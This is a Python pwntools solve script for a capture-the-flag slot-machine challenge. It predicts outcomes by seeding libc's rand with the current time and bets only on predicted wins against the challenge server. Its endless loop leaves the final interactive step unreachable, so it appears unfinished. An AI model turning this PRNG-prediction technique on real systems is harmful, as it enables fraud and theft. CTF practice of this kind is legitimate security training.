#!/usr/bin/env python3

from pwn import *
import ctypes
import random
import time
exe = ELF("./rigged_slot1_patched")
libc = ctypes.CDLL("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("riggedslot1.ctf.intigriti.io", 1332)

    return r


def main():
    r = conn()
    libc.srand(libc.time(0) + 3)
    while(1):
        
        number = libc.rand() % 100
        if number <= 19:
            info(b'Number: ' + str(number).encode())
            r.sendlineafter(b'Enter your bet amount (up to $100 per spin): ', b'10')
            r.recvuntil(b'\n')
            info(r.recvuntil(b'\n'))
            # pause()
        else: 
            continue
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()